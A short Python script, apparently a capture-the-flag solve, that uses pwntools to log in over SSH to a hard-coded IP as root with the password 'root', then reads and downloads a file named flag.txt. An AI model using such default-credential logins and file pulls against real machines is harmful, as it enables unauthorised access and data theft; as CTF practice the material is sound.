import pwn

shell = pwn.ssh(host="237.84.2.178", port=22, user="root", password="root")

shell["cat flag.txt"]

shell.download("flag.txt")
shell.sendline("cat flag.txt")

shell.recvline()
# shell.interactive()
# shell.close()
